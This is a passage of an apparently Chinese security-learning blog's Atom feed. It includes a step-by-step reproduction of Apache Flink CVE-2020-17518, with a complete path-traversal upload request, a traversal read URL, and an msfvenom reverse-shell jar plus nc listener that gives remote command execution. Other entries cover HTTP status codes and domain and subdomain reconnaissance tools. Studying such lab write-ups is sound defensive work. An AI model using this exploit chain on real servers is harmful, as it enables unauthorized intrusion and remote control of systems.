&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/CVE-2021-3156/4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;接下来直接执行 POC，漏洞利用成功，到此为止&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/CVE-2021-3156/5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="CVE漏洞复现" scheme="http://avenue.cool/categories/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
        <category term="CVE漏洞复现" scheme="http://avenue.cool/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
        <updated>2021-02-01T09:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/apache-Flink_CVE-2020-17518/</id>
        <title>Apache-Flink_CVE-2020-17518</title>
        <link rel="alternate" href="http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/apache-Flink_CVE-2020-17518/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;apache-flink文件上传&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache-flink文件上传&#34;&gt;#&lt;/a&gt; Apache Flink 文件上传&lt;/h1&gt;&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 【原理】&lt;/h2&gt;&lt;p&gt;Apache Flink 是由 Apache 软件基金会开发的开源流处理框架，其核心是用 Java 和 Scala 编写的分布式流数据流引擎。Flink 以数据并行和流水线方式执行任意流数据程序，Flink 的流水线运行时系统可以执行批处理和流处理程序。此外，Flink 的运行时本身也支持迭代算法的执行。Flink 在 1.5.1 版本中引入了一个 REST handler，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过一个恶意修改的 HTTP 头将这些文件写入到 Flink 1.5.1 可以访问的任意位置。&lt;/p&gt;&lt;h2 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 【工具】&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;浏览器&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#步骤&#34;&gt;#&lt;/a&gt; 【步骤】&lt;/h2&gt;&lt;p&gt;访问：http://your-ip:8081 进入 Apache Flink 控制面板：&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;打开 BUrp 构造 POC，上传文件&lt;/p&gt;&lt;pre&gt;&lt;code&gt;
POST /jars/upload HTTP/1.1
Host: 192.168.243.189:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------13247690941547071692111317477
Content-Length: 250
Origin: http://192.168.243.189:8081
Connection: close
Referer: http://192.168.243.189:8081/

-----------------------------13247690941547071692111317477
Content-Disposition: form-data; name=&amp;quot;jarfile&amp;quot;; filename=&amp;quot;../../../../../../tmp/success&amp;quot;
Content-Type: text/plain


success
-----------------------------13247690941547071692111317477-

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;此时，我们利用之前的任意文件读取漏洞，读取我们上传的文件，查看是否上传成功。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;http://192.168.243.189:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fsuccess

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;我们还可以上传 jar 马实现反弹监听从而远程命令执行&lt;/p&gt;&lt;p&gt;首先我们使用 kali 的 MSF 生成 jar 马：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p java/shell_reverse_tcp lhost=192.168.243. lport=5555 -f jar &amp;gt;/home/kali/Desktop/shell.jar
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;然后本地机器新建命令行窗口，使用 nc 进行端口监听：&lt;/p&gt;&lt;p&gt;nc -lvvp 5555&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;最后把生成的 jar 马通过 Submit New Job 模块进行上传：&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;点击 Submit 即可实现 jar 马反弹监听：&lt;/p&gt;&lt;p&gt;可以执行远程命令：&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="CVE漏洞复现" scheme="http://avenue.cool/categories/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
        <category term="CVE漏洞复现" scheme="http://avenue.cool/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
        <updated>2021-02-01T09:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Web-Foundation/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/</id>
        <title>4. WEB HTTP 状态码</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Web-Foundation/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;常见的状态码含义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的状态码含义&#34;&gt;#&lt;/a&gt; 常见的状态码含义：&lt;/h2&gt;&lt;p&gt;100 继续 ： 服务器返回此代码已收到请求的第一部分，正在等待其他部分。&lt;br&gt;101 切换协议： 请求者要求服务器切换协议，服务器已确认并准备切换。&lt;br&gt;200 成功：表示客户端发来的请求在服务器端被正常处理了。&lt;br&gt;301 永久移动：请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。&lt;br&gt;302 临时移动：服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求&lt;br&gt;400 Bad Request：表示请求报文中存在语法错误。&lt;br&gt;401 Unauthorized：表示发送的请求需要有通过 HTTP 认证的信息。&lt;br&gt;403 Forbidden：表明对请求资源的访问被服务器拒绝了。&lt;br&gt;404 Not Found：服务器无法找到请求的资源。&lt;br&gt;405 方法禁用：禁用请求中的方法。&lt;br&gt;408 请求超时： 服务器登后请求时发生超时。&lt;br&gt;500 Internal Server Error：表明服务器端在执行请求时发生了错误。&lt;br&gt;502 错误网关： 服务器作为网关或代理，从上游服务器收到无效响应。&lt;br&gt;503 Service Unavailable：表明服务器暂时处于超负载或进行停机维护&lt;br&gt;504 网关超时：服务器作为网关或代理，但是没有及时从上游服务器收到请求。&lt;br&gt;505 HTTP 版本不受支持：&lt;br&gt;服务器不支持请求中所用的 HTTP 协议版本。&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/categories/WEB/Web-Foundation/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/tags/WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:31:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Information-Gathering/2.%20%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/</id>
        <title>2. 收集域名信息</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Information-Gathering/2.%20%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;p&gt;知道目标域名之后，我们要做的第一件事情就是获取域名的注册信息，包括该域名的 DNS 服务器信息和注册人的联系信息等。&lt;/p&gt;&lt;h2 id=&#34;whois-查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#whois-查询&#34;&gt;#&lt;/a&gt; whois 查询&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;Whois 是一个标准的互联网协议，可以用于收集网络注册信息，注册的域名、IP地址等信息。在Whois查询中，得到注册人的姓名和邮箱信息通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。对中小站点而言，域名所属人往往就是管理员。kali中已经默认安装了whois。whois + 域名
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cua2FsaS5vcmcvZG93bmxvYWRzLw==&#34;&gt;Kali 下 whois 查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dob2lzLmNoaW5hei5jb20v&#34;&gt;域名 Whois 查询 - 站长之家&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aG9pcy5haXpoYW4uY29tLw==&#34;&gt;Whois - 爱站&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=&#34;&gt;IP-38&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2hvaXMubmV0Lw==&#34;&gt;Whois Lookup&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sb29rdXAuaWNhbm4ub3JnLw==&#34;&gt;ICANN Lookup&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aG9pcy5jbG91ZC50ZW5jZW50LmNvbS9kb21haW4/ZG9tYWluPQ==&#34;&gt;域名信息查询 - 腾讯云&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dob2lzLnhpbm5ldC5jb20v&#34;&gt;新网 whois 信息查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9pcHdob2lzLw==&#34;&gt;IP WHOIS 查询 - 站长工具&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;备案信息查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#备案信息查询&#34;&gt;#&lt;/a&gt; 备案信息查询&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;网站备案是根据国家法律规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5iZWlhbmJlaWFuLmNvbS8=&#34;&gt;ICP 备案查询网&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2ljcC5jaGluYXouY29tLw==&#34;&gt;ICP 备案查询 - 站长工具&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYWl6aGFuLmNvbS9zZW8v&#34;&gt;SEO 综合查询 - 爱站&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2ljcC5jaGluYXouY29tL3NlYXJjaHM=&#34;&gt;批量查询 - 站长工具&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iZWlhbi5taWl0Lmdvdi5jbi8jL0ludGVncmF0ZWQvaW5kZXg=&#34;&gt;工业和信息化部 ICP/IP/ 域名信息备案管理&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;企业信用信息查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#企业信用信息查询&#34;&gt;#&lt;/a&gt; 企业信用信息查询&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;企业信用指一家第三方征信机构通过征集另一家企业信息，根据征信机构的信用评级规则，评价出的企业信用等级。
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5nc3h0Lmdvdi5jbi9pbmRleC5odG1s&#34;&gt;国家企业信用信息公示系统&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb21wYW55LnhpemhpLmNvbS8=&#34;&gt;悉知 - 全国企业信息查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY3JlZGl0Y2hpbmEuZ292LmNuLw==&#34;&gt;信用中国 - 个人信用查询搜索 - 企业信息查询搜索&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudGlhbnlhbmNoYS5jb20v&#34;&gt;天眼查&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucWljaGFjaGEuY29tLw==&#34;&gt;企查查&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueGlhb2xhbmJlbi5jb20v&#34;&gt;小蓝本&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucWl4aW4uY29tLw==&#34;&gt;启信宝&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94aW4uYmFpZHUuY29tLw==&#34;&gt;百度企业信用&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;浏览器插件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#浏览器插件&#34;&gt;#&lt;/a&gt; 浏览器插件&lt;/h2&gt;&lt;p&gt;通过 Google、FireFox 等插件的使用，收集域名信息&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="信息收集" scheme="http://avenue.cool/categories/WEB/Information-Gathering/" />
        <category term="信息收集" scheme="http://avenue.cool/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
        <updated>2020-09-06T02:31:20.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Information-Gathering/%7F3.%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
        <title>3. 子域名信息收集</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Information-Gathering/%7F3.%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;收集子域名信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#收集子域名信息&#34;&gt;#&lt;/a&gt; 收集子域名信息&lt;/h2&gt;&lt;p&gt;主域名是由两个或两个以上字母构成，中间由点号隔开，这个域名只有一个点号，子域名是顶级域名的下一级，域名整体包含两个 “.” 号。&lt;/p&gt;&lt;p&gt;子域名也就是二级域名，是指顶级域名下的域名。假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标，这无疑是个比较好的选择。那么问题来了，怎样才能尽可能多地搜集目标的高价值子域呢？常用的方法有以下这几种。&lt;/p&gt;&lt;h3 id=&#34;常见子域名的收集方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见子域名的收集方法&#34;&gt;#&lt;/a&gt; 常见子域名的收集方法：&lt;/h3&gt;&lt;p&gt;（1） Web 子域名猜测与实际访问尝试&lt;br&gt;（2） 搜索引擎查询主域名地址&lt;br&gt;（3）查询 DNS 解析记录&lt;br&gt;（4） 基于 DNS 查询的暴力破解&lt;br&gt;（5）手工分析（查看主站页面及相关页面）&lt;/p&gt;&lt;h3 id=&#34;在线平台查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在线平台查询&#34;&gt;#&lt;/a&gt; 在线平台查询&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=&#34;&gt;ip138&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9zdWJkb21haW4vP2RvbWFpbj0v&#34;&gt;站长工具&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oYWNrZXJ0YXJnZXQuY29tL2ZpbmQtZG5zLWhvc3QtcmVjb3Jkcy8=&#34;&gt;hackertarget&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudDFoMnVhLmNuL3Rvb2xzLw==&#34;&gt;t1h2ua&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v&#34;&gt;dnsdumpster&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kLmNoaW5hY3ljYy5jb20vaW5kZXgucGhwP209TG9naW4mYW1wO2E9aW5kZXg=&#34;&gt;chinacycc&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v&#34;&gt;dnsdumpster&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3ouemNqdW4uY29tLw==&#34;&gt;zcjun&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy55dW02LmNuL1Rvb2xzL3VybGJsYXN0Lw==&#34;&gt;tools.yum6.cn&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rvb2xzLmJ1Z3NjYW5lci5jb20vc3ViZG9tYWluLw==&#34;&gt;tools.bugscaner&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&#34;ip反查绑定域名网站&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ip反查绑定域名网站&#34;&gt;#&lt;/a&gt; IP 反查绑定域名网站&lt;/h3&gt;&lt;p&gt;IP 关联域名，大部分网站一个 IP 多个域名&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3MudG9vbC5jaGluYXouY29tL3NhbWU/cw==&#34;&gt;站长之家&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbnMuYWl6aGFuLmNvbS8=&#34;&gt;爱站&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2Vic2Nhbi5jYy8=&#34;&gt;webscan&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy4xMTRiZXN0LmNvbS9pcC8=&#34;&gt;同 IP 网站查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZXZlcnNlaXAuZG9tYWludG9vbHMuY29tLw==&#34;&gt;反向 IP 查询&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&#34;资产搜索引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资产搜索引擎&#34;&gt;#&lt;/a&gt; 资产搜索引擎&lt;/h3&gt;&lt;p&gt;google、shodan、FOFA、zoomeye&lt;/p&gt;&lt;h3 id=&#34;工具枚举&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具枚举&#34;&gt;#&lt;/a&gt; 工具枚举&lt;/h3&gt;&lt;p&gt;常用子域名工具如下（Github 上都可搜到）&lt;/p&gt;&lt;ol&gt;&lt;li&gt;OneForAll&lt;br&gt;OneForAll 是一款功能强大的子域收集工具，拥有多个模块和接口扫描，收集子域信息很全，包括子域、子域 IP、子域常用端口、子域 Title、子域 Banner、子域状态等。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGw=&#34;&gt;项目地址&lt;/span&gt;&lt;br&gt;子域名收集： python3 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL29uZWZvcmFsbC5weQ==&#34;&gt;oneforall.py&lt;/span&gt; --target=&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3RhcmdldC5jb20=&#34;&gt;target.com&lt;/span&gt; run&lt;/p&gt;&lt;ol start=&#34;2&#34;&gt;&lt;li&gt;&lt;p&gt;Layer&lt;br&gt;Layer 子域名挖掘机的使用方法比较简单，在域名对话框中直接输入域名就可以进行扫描，它的显示界面比较细致，有域名、解析 IP、开放端口、Web 服务器和网站状态等&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;subDomainsBrute&lt;br&gt;subDomainsBrute 的特点是可以用小字典递归地发现三级域名、四级域名，甚至五级域名等不容易被探测到的域名。&lt;br&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZQ==&#34;&gt;项目地址&lt;/span&gt;&lt;br&gt;子域名收集：python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3N1YkRvbWFpbnNicnV0ZS5weQ==&#34;&gt;subDomainsbrute.py&lt;/span&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3h0YXJnZXQuY29t&#34;&gt;xtarget.com&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 id=&#34;证书透明度公开日志枚举&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#证书透明度公开日志枚举&#34;&gt;#&lt;/a&gt; 证书透明度公开日志枚举&lt;/h3&gt;&lt;p&gt;证书透明度 (Certificate Transparency, CT) 是证书授权机构 (CA) 的一个项目，证书授权机构会将每个 SSL/TLS 证书发布到公共日志中。一个 SSL/TLS 证书通常包含域名、子域名和邮件地址， 这些也经常成为攻击者非常希望获得的有用信息。查找某个域名所属证书的最简单的方法就是使用搜索引 | 擎搜索一些公开的 CT 日志。&lt;/p&gt;&lt;p&gt;在线第三方平台查询&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jcnQuc2gv&#34;&gt;crt.sh&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jZW5zeXMuaW8v&#34;&gt;censys&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9teXNzbC5jb20v&#34;&gt;myssl&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&#34;ns历史解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ns历史解析&#34;&gt;#&lt;/a&gt; NS 历史解析&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZG5zZGIuaW8v&#34;&gt;dnsdb&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92aWV3ZG5zLmluZm8v&#34;&gt;viewdns&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="信息收集" scheme="http://avenue.cool/categories/WEB/Information-Gathering/" />
        <category term="信息收集" scheme="http://avenue.cool/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
        <updated>2020-09-06T02:31:20.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Linux/Linux/</id>
        <title>Linuxdf</title>
        <link rel="alternate" href="http://avenue.cool/Linux/Linux/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;p&gt;linux&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="Linux运维" scheme="http://avenue.cool/categories/Linux%E8%BF%90%E7%BB%B4/" />
        <category term="Linux运维" scheme="http://avenue.cool/tags/Linux%E8%BF%90%E7%BB%B4/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Intranet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/</id>
        <title>内网安全知识</title>
        <link rel="alternate" href="http://avenue.cool/Intranet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;p&gt;内网安全知识&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="内网安全知识" scheme="http://avenue.cool/categories/Intranet/" />
        <category term="内网安全知识" scheme="http://avenue.cool/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Web-Foundation/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4/</id>
        <title>3. WEB常见的HTTP响应头</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Web-Foundation/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4/"/>
